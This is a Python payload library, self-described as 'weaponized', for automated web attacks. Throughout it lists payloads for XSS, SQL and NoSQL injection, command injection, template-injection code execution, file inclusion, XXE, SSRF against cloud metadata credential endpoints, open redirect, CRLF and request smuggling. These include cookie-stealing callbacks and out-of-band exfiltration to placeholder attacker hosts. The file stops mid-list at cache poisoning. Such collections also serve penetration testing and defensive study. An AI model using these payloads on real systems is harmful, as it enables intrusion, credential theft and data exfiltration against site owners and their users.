"""
PAYLOAD ENCYCLOPEDIA v6 - Massive weaponized payload library.
Sources: PortSwigger, PayloadsAllTheThings, OWASP, HackTricks, real bug bounty PoCs.
Each category groups payloads by context/technology for intelligent adaptive selection.
"""

# ============================================================================
# XSS PAYLOADS - Context-aware (HTML/Attribute/JS/URL/CSS)
# ============================================================================
XSS_PAYLOADS = {
    'html_context': [
        # Classic
        '<script>alert(1)</script>',
        '<script>alert`1`</script>',
        '<script>confirm(1)</script>',
        '<script>prompt(1)</script>',
        '<script>console.log(1)</script>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script src="data:,alert(1)"></script>',
        '<script src=//14.rs></script>',
        # Image
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror="alert`1`">',
        '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
        '<img/src=x onerror=alert(1)>',
        '<img src="x:x" onerror="alert(1)">',
        '<img src=x:alert(alt) onerror=eval(src) alt=1>',
        # SVG
        '<svg/onload=alert(1)>',
        '<svg onload=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a>',
        '<svg><script>alert&#40;1&#41;</script>',
        # Body / IFrame
        '<body onload=alert(1)>',
        '<body onpageshow=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<iframe srcdoc="<script>alert(1)</script>">',
        '<iframe src=javascript:alert(document.domain)>',
        # Input / Details / Marquee
        '<input onfocus=alert(1) autofocus>',
        '<input onblur=alert(1) autofocus><input autofocus>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
        '<keygen onfocus=alert(1) autofocus>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        # Object / Embed
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        # Meta / Base
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
        '<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>',
        # Style / Link
        '<style>@import "javascript:alert(1)";</style>',
        '<link rel=stylesheet href=javascript:alert(1)>',
        # Form
        '<form action="javascript:alert(1)"><button>x</button></form>',
        '<form><button formaction=javascript:alert(1)>x</button>',
        # Math (SVG namespace)
        '<math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
        # Unicode / Encoding bypass
        '<script>\\u0061lert(1)</script>',
        '<script>eval("\\u0061lert(1)")</script>',
        '<script>window["\\u0061lert"](1)</script>',
        '<img src=x onerror="&#97;lert(1)">',
        '<img src=x onerror="\u0061lert(1)">',
        # DOM clobbering
        '<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>',
        # Modern browsers
        '<xss id=x tabindex=1 onactivate=alert(1)></xss>',
        '<xss onbeforescriptexecute=alert(1)><script>1</script>',
        # WAF Bypass — Cloudflare
        '<a href="javascript:alert(1)">click',
        '<a href="\x01javascript:alert(1)">click',
        '<a href="\tjavascript:alert(1)">click',
        '<img src=1 onerror\x0b=alert(1)>',
        '<img src=1 onerror\x00=alert(1)>',
        # Polyglot (works in multiple contexts)
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        '"><script>alert(1)</script>',
        '\'"><svg/onload=alert(1)>',
        '</textarea><script>alert(1)</script>',
        '</title><script>alert(1)</script>',
        '</style><script>alert(1)</script>',
    ],
    'attribute_context': [
        '" onmouseover=alert(1) x="',
        '" onfocus=alert(1) autofocus="',
        '\' onmouseover=alert(1) x=\'',
        '"><script>alert(1)</script>',
        '"><img src=x onerror=alert(1)>',
        '"><svg onload=alert(1)>',
        'javascript:alert(1)',
        'jaVasCript:alert(1)',
        'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
        'x" autofocus onfocus="alert(1)"',
        '" style="animation-name:x" onanimationstart="alert(1)',
    ],
    'js_context': [
        # Break out of string
        '\';alert(1);//',
        '";alert(1);//',
        '\\\';alert(1);//',
        '</script><script>alert(1)</script>',
        # Template literals
        '${alert(1)}',
        '`${alert(1)}`',
        # Function calls
        'alert(1)',
        'alert`1`',
        # JSON breakout
        '"}));alert(1);//',
        '"}}));alert(1);//',
    ],
    'url_context': [
        'javascript:alert(1)',
        'javascript:alert(document.domain)',
        'javascript:alert%281%29',
        'jaVasCript:alert(1)',
        'JavaScript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
        'vbscript:msgbox(1)',
    ],
    'dom_sinks': [
        'javascript:void(0)/*"onmouseover=alert(1)*/',
        '#<img src=x onerror=alert(1)>',
        '#"><script>alert(1)</script>',
        '#\'"><svg onload=alert(1)>',
    ],
    'blind_xss': [
        # Insert your own callback host at runtime
        '"><script src=https://{OOB}/x.js></script>',
        '"><img src=x onerror="fetch(\'https://{OOB}/?c=\'+document.cookie)">',
        '<script>document.location=\'https://{OOB}/?c=\'+document.cookie</script>',
        '"><svg onload="fetch(\'https://{OOB}/?d=\'+document.domain)">',
    ],
    'waf_bypass': [
        # Cloudflare/Akamai bypass patterns
        '<Svg OnLoad=confirm(1)>',
        '<svg><script>&#97lert(1)</script>',
        '<svg><script>&#x61;lert(1)</script>',
        '<img src=x onError=alert(1)>',
        '<iMg src=x OnError=alert(1)>',
        '<img/src=`x`/onerror=alert(1)>',
        '<img src=x onerror=alert&lpar;1&rpar;>',
        '<script>window[\'ale\'+\'rt\'](1)</script>',
        '<script>self[\'ale\'+\'rt\'](1)</script>',
        '<script>[].constructor.constructor(\'alert(1)\')()</script>',
        # Case & spacing
        '< Script >alert(1)</ Script >',
        '<script/x>alert(1)</script>',
        '<script\n>alert(1)</script>',
        '<script\x0Balert(1)</script>',
    ],
}

# ============================================================================
# SQL INJECTION PAYLOADS - Per DBMS + Detection + Extraction
# ============================================================================
SQLI_PAYLOADS = {
    'detection': [
        "'", '"', '`', '\\', "''", '""', "')", '")',
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        '" OR "1"="1', '" OR 1=1--', '" OR 1=1#',
        "') OR ('1'='1", "')) OR (('1'='1",
        # Error triggers
        "'", "\\'", "\\\\'", "'\"",
        "1'", "1\"", "1\\", "1' AND '1", "1' AND 1--",
        "'||'1", "'+'1", "' AND SLEEP(0)--",
    ],
    'boolean_based': [
        # True conditions
        "' AND '1'='1", "' AND 1=1--", "' AND 1=1#",
        "1 AND 1=1", "1' AND '1'='1' -- -",
        # False conditions (compare responses)
        "' AND '1'='2", "' AND 1=2--", "' AND 1=2#",
        "1 AND 1=2", "1' AND '1'='2' -- -",
    ],
    'union_based': [
        "' UNION SELECT NULL-- -",
        "' UNION SELECT NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL-- -",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -",
        # Version extraction
        "' UNION SELECT @@version,NULL-- -",              # MySQL/MSSQL
        "' UNION SELECT version(),NULL-- -",              # PostgreSQL
        "' UNION SELECT banner,NULL FROM v$version-- -",  # Oracle
        "' UNION SELECT sqlite_version(),NULL-- -",       # SQLite
        # Table extraction
        "' UNION SELECT table_name,NULL FROM information_schema.tables-- -",
        "' UNION SELECT column_name,NULL FROM information_schema.columns-- -",
    ],
    'time_based': {
        'mysql': [
            "' AND SLEEP(5)-- -",
            "' AND SLEEP(5)#",
            "1' AND SLEEP(5)-- -",
            "' OR SLEEP(5)-- -",
            "'; SELECT SLEEP(5)-- -",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
            "' AND BENCHMARK(10000000,MD5(1))-- -",
            "\"XOR(if(now()=sysdate(),sleep(5),0))XOR\"Z",
        ],
        'postgresql': [
            "'; SELECT pg_sleep(5)-- -",
            "' OR pg_sleep(5)-- -",
            "' AND pg_sleep(5)-- -",
            "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
        ],
        'mssql': [
            "'; WAITFOR DELAY '0:0:5'-- -",
            "1); WAITFOR DELAY '0:0:5'-- -",
            "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -",
        ],
        'oracle': [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a",
            "' OR DBMS_LOCK.SLEEP(5)-- -",
        ],
        'sqlite': [
            "' AND RANDOMBLOB(500000000)-- -",
            "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -",
        ],
    },
    'error_based': {
        'mysql': [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)-- -",
            "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2)))s),1,1)))-- -",
        ],
        'postgresql': [
            "' AND CAST((SELECT version()) AS INT)-- -",
            "' AND 1=CAST((SELECT version()) AS INT)-- -",
        ],
        'mssql': [
            "' AND 1=CONVERT(int,(SELECT @@version))-- -",
            "' AND 1=(SELECT top 1 name FROM master..sysdatabases)-- -",
        ],
        'oracle': [
            "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||(SELECT banner FROM v$version WHERE ROWNUM=1)||CHR(62))) FROM dual)-- -",
        ],
    },
    'oob_dns': {
        'mysql': [
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT hex(user())),'.{OOB}\\\\a.txt'))-- -",
        ],
        'mssql': [
            "'; DECLARE @q VARCHAR(200);SET @q=(SELECT 'xp_dirtree ''\\\\'+(SELECT db_name())+'.{OOB}\\a''');EXEC(@q)-- -",
        ],
        'oracle': [
            "' UNION SELECT UTL_HTTP.REQUEST('http://{OOB}/'||(SELECT user FROM dual)) FROM dual-- -",
            "' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{OOB}') FROM dual-- -",
        ],
        'postgresql': [
            "'; COPY (SELECT '') TO PROGRAM 'nslookup {OOB}'-- -",
        ],
    },
    'auth_bypass': [
        "admin' --",
        "admin' #",
        "admin'/*",
        "' or 1=1--",
        "' or 1=1#",
        "' or 1=1/*",
        "') or '1'='1--",
        "') or ('1'='1--",
        "admin' or '1'='1",
        "admin' or '1'='1' --",
        "admin' or '1'='1' /*",
        "1' or '1' = '1",
        "1' or '1' = '1' /*",
        "1) or ('1'='1--",
        "\" or 1=1--",
        "\" or \"a\"=\"a",
        "') or ('a'='a",
        "\") or (\"a\"=\"a",
    ],
    'waf_bypass': [
        # Whitespace bypass
        "'/**/OR/**/1=1--",
        "'%09OR%091=1--",
        "'%0AOR%0A1=1--",
        "'+OR+1=1--",
        # Case
        "'oR'1'='1",
        "' Or '1'='1",
        # Keyword split
        "' UNunionION SELselectECT 1,2,3-- -",
        "' UNION/**/SELECT/**/1,2,3-- -",
        # Quote alternatives
        "0x27 OR 0x31=0x31--",
        # Comment variations
        "' OR 1=1-- -",
        "' OR 1=1#\n",
        "'/*!50000OR*/1=1-- -",
    ],
    'graphql': [
        # Basic detection
        '{__schema{types{name}}}',
        'query{__typename}',
    ],
}

# ============================================================================
# NoSQL INJECTION PAYLOADS
# ============================================================================
NOSQLI_PAYLOADS = {
    'mongo_operator': [
        {'$ne': None},
        {'$ne': ''},
        {'$gt': ''},
        {'$regex': '.*'},
        {'$where': 'sleep(5000) || true'},
        {'$where': 'function() { sleep(5000); return true; }'},
        {'$exists': True},
    ],
    'mongo_string': [
        "' || '1'=='1",
        "'||1==1//",
        "'||1==1%00",
        "'; return true; var x='",
        "\"; return true; var x=\"",
        "';return(true);var x='",
        "'; sleep(5000); return 'x'=='x",
        "'; return db.a.find(); var x='",
    ],
    'auth_bypass': [
        # Login form param manipulations
        'username[$ne]=admin&password[$ne]=x',
        'username[$regex]=.*&password[$regex]=.*',
        'username=admin&password[$ne]=x',
    ],
    'json_auth_bypass': [
        {'username': {'$ne': None}, 'password': {'$ne': None}},
        {'username': 'admin', 'password': {'$ne': 'x'}},
        {'username': {'$gt': ''}, 'password': {'$gt': ''}},
        {'username': {'$regex': '^admin'}, 'password': {'$regex': '.*'}},
    ],
    'js_injection': [
        '0;return true',
        '0;return(true)',
        ';return(true);var x=',
        '\'; return \'a\'==\'a\' && \'\'==\'',
        '\\\'; return true; var x=\\\'',
    ],
}

# ============================================================================
# COMMAND INJECTION PAYLOADS
# ============================================================================
CMD_INJECTION_PAYLOADS = {
    'unix': [
        # Direct
        ';id', '|id', '&id', '&&id', '||id',
        '`id`', '$(id)',
        # With newlines
        '\nid\n', '\n/bin/id\n',
        # Backgrounded
        ';id #', '|id #', '&& id ;',
        # Space bypass
        ';${IFS}id',
        ';{cat,/etc/passwd}',
        ';cat</etc/passwd',
        ';cat$IFS/etc/passwd',
        # PATH bypass
        ';/usr/bin/id',
        ';/bin/id',
        # Detection markers
        '; echo VULN_$$_$(id -u)',
        '| echo VULN_$$_$(whoami)',
        '`echo VULN_$$_$(hostname)`',
        # File exfil
        ';cat /etc/passwd',
        ';cat /etc/hosts',
        # Reverse shell (educational — DO NOT use without permission)
        # ';bash -i >& /dev/tcp/ATTACKER/443 0>&1',
    ],
    'windows': [
        '&whoami', '&&whoami', '|whoami', '||whoami',
        '&dir', '&&dir', '|dir',
        '&type C:\\Windows\\win.ini',
        '&ver',
        '&hostname',
        # PowerShell
        '&powershell -c whoami',
        '&powershell -c \'hostname\'',
    ],
    'blind_time': {
        'unix': [
            ';sleep 5',
            '|sleep 5',
            '&&sleep 5',
            '`sleep 5`',
            '$(sleep 5)',
            ';ping -c 5 127.0.0.1',
            '|ping -c 5 127.0.0.1',
        ],
        'windows': [
            '&ping -n 5 127.0.0.1',
            '&&timeout /T 5',
            '&powershell -c "Start-Sleep 5"',
        ],
    },
    'blind_oob': [
        '`nslookup {OOB}`',
        ';nslookup {OOB}',
        '|nslookup {OOB}',
        '$(curl {OOB})',
        ';curl {OOB}',
        ';wget {OOB}',
        '`curl {OOB}`',
        # DNS-only (no HTTP)
        ';host `whoami`.{OOB}',
        ';nslookup `whoami`.{OOB}',
    ],
    'filter_bypass': [
        # No space
        '{cat,/etc/passwd}',
        'cat$IFS/etc/passwd',
        'cat${IFS}/etc/passwd',
        # Quotes
        'c"a"t /etc/passwd',
        'c\'a\'t /etc/passwd',
        'ca\\t /etc/passwd',
        # Base64
        'echo BASE64|base64 -d|bash',
        # Var expansion
        'l\\s',
        'l""s',
        'ls${x}',
    ],
}

# ============================================================================
# SSTI (Server-Side Template Injection) — engine-specific
# ============================================================================
SSTI_PAYLOADS = {
    'detection': [
        '{{7*7}}',
        '${7*7}',
        '<%= 7*7 %>',
        '#{7*7}',
        '${{7*7}}',
        '@(7*7)',
        '{{7*\'7\'}}',
        '{{7*7}}|',
        '{{7*7}}[[${7*7}]]',
        '<%=7*7%>',
    ],
    'jinja2': [
        '{{config}}',
        '{{config.items()}}',
        '{{self.__init__.__globals__}}',
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        # Bypass
        '{{ ""["__class__"]["__mro__"][1]["__subclasses__"]() }}',
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{% endif %}{% endfor %}",
    ],
    'twig': [
        '{{7*7}}',
        '{{_self}}',
        '{{_self.env}}',
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
        "{{['id']|filter('system')}}",
        "{{['id',null]|reduce('system')}}",
        "{{['cat\\x20/etc/passwd']|filter('system')}}",
    ],
    'freemarker': [
        '${7*7}',
        '<#assign x="freemarker.template.utility.Execute"?new()>${ x("id") }',
        '${"freemarker.template.utility.Execute"?new()("id")}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }',
    ],
    'velocity': [
        '#set($x=7*7)$x',
        '#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")',
    ],
    'smarty': [
        '{$smarty.version}',
        '{php}echo `id`;{/php}',
        '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system(\\"id\\") ?>",self::clearConfig())}',
    ],
    'thymeleaf': [
        '${7*7}',
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    'razor': [
        '@(7*7)',
        "@{// C#\nvar cmd = new System.Diagnostics.Process();\ncmd.StartInfo.FileName = \"cmd.exe\";\ncmd.StartInfo.Arguments = \"/c whoami\";\ncmd.Start();}",
    ],
    'erb': [
        '<%= 7*7 %>',
        '<%= system("id") %>',
        '<%= `id` %>',
        '<%= IO.popen("id").read() %>',
    ],
    'handlebars': [
        '{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require(\'child_process\').execSync(\'id\');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}',
    ],
    'jsp_el': [
        '${7*7}',
        "${''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}",
    ],
}

# ============================================================================
# LFI / RFI / Path Traversal
# ============================================================================
LFI_PAYLOADS = {
    'unix': [
        '/etc/passwd',
        '../../../../../../etc/passwd',
        '../../../../../../../etc/passwd',
        '../../../../../../../../etc/passwd',
        '..%2f..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252fetc%252fpasswd',
        '....//....//....//etc/passwd',
        '..\\..\\..\\..\\etc\\passwd',
        '/./././././etc/passwd',
        # Null byte (older PHP)
        '../../../../etc/passwd%00',
        '../../../../etc/passwd%00.jpg',
        # UTF-8 encoding
        '..%c0%af..%c0%afetc/passwd',
        '..%c1%9c..%c1%9cetc/passwd',
        # File wrapper (PHP)
        'file:///etc/passwd',
        'php://filter/convert.base64-encode/resource=/etc/passwd',
        'php://filter/convert.base64-encode/resource=index.php',
        'php://filter/read=convert.base64-encode/resource=../config.php',
        'php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd',
        'php://input',
        'expect://id',
        'data://text/plain,<?php system("id"); ?>',
        'data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOyA/Pg==',
        # /proc/self
        '/proc/self/environ',
        '/proc/self/cmdline',
        '/proc/self/status',
        '/proc/self/fd/0',
        '/proc/self/mounts',
        '/proc/version',
        '/proc/cpuinfo',
    ],
    'windows': [
        'C:\\Windows\\win.ini',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
        '..\\..\\..\\..\\Windows\\win.ini',
        '..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
        '..%5c..%5c..%5c..%5cWindows%5cwin.ini',
        'C:/Windows/win.ini',
        'C:/boot.ini',
    ],
    'sensitive_files': [
        # App config
        '.env', 'config.php', 'wp-config.php', 'settings.py',
        'application.properties', 'application.yml',
        'web.config', 'appsettings.json',
        # Version control
        '.git/config', '.git/HEAD', '.svn/entries', '.hg/hgrc',
        # Backups
        'backup.zip', 'db.sql', 'dump.sql', 'backup.tar.gz',
        # Server
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/etc/nginx/nginx.conf',
        '/etc/apache2/apache2.conf',
        '/etc/httpd/conf/httpd.conf',
        '/etc/ssh/sshd_config',
        '/root/.bash_history',
        '/root/.ssh/id_rsa',
        '/home/*/.bash_history',
        '/home/*/.ssh/id_rsa',
    ],
    'rfi': [
        # Remote file inclusion
        'https://raw.githubusercontent.com/{ATTACKER}/x/main/shell.txt',
        'http://{ATTACKER}/shell.txt',
        # SMB (Windows)
        '\\\\{ATTACKER}\\share\\shell.php',
    ],
    'log_poisoning': [
        # After sending User-Agent: <?php system($_GET["c"]); ?> then LFI:
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/proc/self/environ',
    ],
}

# ============================================================================
# XXE (XML External Entity)
# ============================================================================
XXE_PAYLOADS = {
    'basic': [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>',
    ],
    'blind_oob': [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://{OOB}/x.dtd">%ext;]><r></r>',
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://{OOB}/">%ext;]><r/>',
    ],
    'blind_error': [
        # Requires OOB DTD hosting `%error;`
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % remote SYSTEM "http://{OOB}/evil.dtd">%remote;%int;%trick;]>',
    ],
    'svg_xxe': [
        '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>',
    ],
    'soap_xxe': [
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body>&xxe;</soap:Body></soap:Envelope>',
    ],
    'billion_laughs': [
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><lolz>&lol3;</lolz>',
    ],
    'utf7_bypass': [
        '<?xml version="1.0" encoding="UTF-7"?>+ADwAIQ-DOCTYPE r +AFsAPAAh-ENTITY x SYSTEM +ACIAZgBpAGwAZQA6AC8ALwAvAGUAdABjAC8AcABhAHMAcwB3AGQAIg-+AF0-+AD4-+ADwAcgA+-+ACY-x+ADsAPAAvAHIAPg-',
    ],
}

# ============================================================================
# SSRF - Server-Side Request Forgery
# ============================================================================
SSRF_PAYLOADS = {
    'localhost': [
        'http://127.0.0.1', 'http://localhost',
        'http://127.0.0.1:80', 'http://127.0.0.1:22',
        'http://127.0.0.1:3306', 'http://127.0.0.1:5432',
        'http://127.0.0.1:6379', 'http://127.0.0.1:9200',
        'http://127.0.0.1:8080', 'http://127.0.0.1:8000',
        'http://127.0.0.1:8888', 'http://127.0.0.1:9090',
        'http://127.0.0.1:5000',
        # IPv6
        'http://[::1]', 'http://[::]',
        # IPv4 alt
        'http://0.0.0.0', 'http://0', 'http://[0:0:0:0:0:ffff:127.0.0.1]',
        # Decimal / Octal / Hex
        'http://2130706433',       # decimal 127.0.0.1
        'http://017700000001',      # octal
        'http://0x7f.0x0.0x0.0x1',  # hex per octet
        'http://0x7f000001',        # single hex
        'http://127.1', 'http://127.0.1',
        # DNS rebinding
        'http://localtest.me', 'http://spoofed.burpcollaborator.net',
        'http://customer1.app.localhost.my.company.127.0.0.1.nip.io',
    ],
    'cloud_metadata': {
        'aws': [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/admin',
            'http://169.254.169.254/latest/user-data/',
            'http://169.254.169.254/latest/dynamic/instance-identity/document',
            # IMDSv2 (requires PUT + token)
            # 'http://169.254.169.254/latest/api/token',
            # Bypass via alt IP encoding
            'http://[fd00:ec2::254]/latest/meta-data/',
            'http://169.254.169.254.nip.io/latest/meta-data/',
        ],
        'gcp': [
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity',
            'http://metadata.google.internal/computeMetadata/v1/project/project-id',
            'http://169.254.169.254/computeMetadata/v1/',
        ],
        'azure': [
            'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
            'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
        ],
        'digitalocean': [
            'http://169.254.169.254/metadata/v1.json',
            'http://169.254.169.254/metadata/v1/',
            'http://169.254.169.254/metadata/v1/user-data',
        ],
        'alibaba': [
            'http://100.100.100.200/latest/meta-data/',
            'http://100.100.100.200/latest/meta-data/ram/security-credentials/',
        ],
        'oracle': [
            'http://192.0.0.192/latest/meta-data/',
        ],
        'kubernetes': [
            'https://kubernetes.default.svc/api/v1/namespaces/',
            'https://kubernetes.default.svc/apis/',
            'https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets',
        ],
    },
    'schema_bypass': [
        'file:///etc/passwd', 'file:///c:/windows/win.ini',
        'gopher://127.0.0.1:6379/_INFO', 'gopher://127.0.0.1:25/_HELO',
        'dict://127.0.0.1:6379/info', 'dict://127.0.0.1:11211/stats',
        'ldap://127.0.0.1:389/', 'sftp://127.0.0.1:22/',
        'tftp://127.0.0.1:69/', 'jar:http://127.0.0.1!/',
    ],
    'redirect_bypass': [
        # Attacker-controlled server that 302s to internal
        'https://{ATTACKER}/redir?to=http://169.254.169.254/latest/meta-data/',
        'https://httpbin.org/redirect-to?url=http://127.0.0.1',
    ],
    'oob_probes': [
        'http://{OOB}',
        'https://{OOB}',
        # DNS-only
        '{OOB}',
    ],
}

# ============================================================================
# OPEN REDIRECT
# ============================================================================
OPEN_REDIRECT_PAYLOADS = [
    'https://evil.com',
    '//evil.com',
    '///evil.com',
    '////evil.com',
    '/\\evil.com',
    '/\\\\evil.com',
    'https:evil.com',
    'https:/\\evil.com',
    '\\/\\/evil.com',
    'https://evil.com/',
    'https://evil.com/%2f..',
    'https://target.com@evil.com',
    'https://target.com.evil.com',
    'https://evil.com#target.com',
    'https://evil.com?target.com',
    'https://evil.com/?target.com',
    'https://%2f%2fevil.com',
    'https://%09/evil.com',
    'https://%2fevil.com',
    'http://0xd8.0x3a.0xd6.0xce',  # google.com in hex
    'javascript://target.com?%0aalert(1)',
    'data:text/html,<script>location=\'https://evil.com\'</script>',
    # URL fragmentation
    'https://target.com%2eevil.com',
    'https://target.com%252eevil.com',
    'https://target.com\\@evil.com',
    'https://target.com%00@evil.com',
    # Backslash trick
    '//\\evil.com',
    '/\\/evil.com',
]

# ============================================================================
# CORS misconfiguration
# ============================================================================
CORS_ORIGINS_TO_TEST = [
    'https://evil.com',
    'null',
    'https://{TARGET}.evil.com',        # subdomain of attacker containing target
    'https://evil.{TARGET}',            # bypass if regex `endswith(target)`
    'https://{TARGET}evil.com',         # missing dot check
    'https://sub.{TARGET}',
    'http://{TARGET}',                  # http/https check missing
]

# ============================================================================
# CRLF Injection
# ============================================================================
CRLF_PAYLOADS = [
    '%0d%0aSet-Cookie:%20crlf=injected',
    '%0d%0aLocation:%20https://evil.com',
    '%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2020%0d%0a%0d%0a<script>alert(1)</script>',
    '%E5%98%8A%E5%98%8DSet-Cookie:%20csrf=injected',   # UTF-8 CRLF
    '%23%0d%0aSet-Cookie:%20crlf=x',
    '%0aX-Injected: header',
    '%0d%0aX-Injected: header',
    '%0dX-Injected: header',
    '%00%0d%0aX-Injected: header',
]

# ============================================================================
# JWT / Auth
# ============================================================================
JWT_ATTACKS = {
    'weak_secrets': [
        'secret', 'password', '123456', 'admin', 'test',
        'jwt', 'jwt_secret', 'your-256-bit-secret',
        'JWTSecret', 'CHANGE_ME', 'changeme',
        'default', 'my-secret', 'my_secret', 'somesecret',
        'secretkey', 'key', 'privateKey', 'super_secret',
        'HS256', 'RS256', '',
        # Real-world leaked defaults
        'flask_secret_key', 'django-insecure-',
    ],
    'none_algo_variants': ['none', 'None', 'NONE', 'nOnE', 'nonE'],
}

# ============================================================================
# HTTP Request Smuggling
# ============================================================================
SMUGGLING_PAYLOADS = {
    'clte': (
        # CL.TE
        'POST / HTTP/1.1\r\n'
        'Host: {HOST}\r\n'
        'Content-Length: 13\r\n'
        'Transfer-Encoding: chunked\r\n\r\n'
        '0\r\n\r\nSMUGGLED'
    ),
    'tecl': (
        # TE.CL
        'POST / HTTP/1.1\r\n'
        'Host: {HOST}\r\n'
        'Content-Length: 3\r\n'
        'Transfer-Encoding: chunked\r\n\r\n'
        '8\r\nSMUGGLED\r\n0\r\n\r\n'
    ),
    'tete_obfuscation': [
        'Transfer-Encoding: chunked',
        'Transfer-Encoding : chunked',
        'Transfer-Encoding: xchunked',
        'Transfer-Encoding: chunked\r\nTransfer-encoding: identity',
        'Transfer-Encoding:\tchunked',
        'Transfer-Encoding: \x0bchunked',
        'X: X\r\nTransfer-Encoding: chunked',
    ],
}

# ============================================================================
# Cache Poisoning
# ============================================================================
CACHE_POISON_HEADERS = [
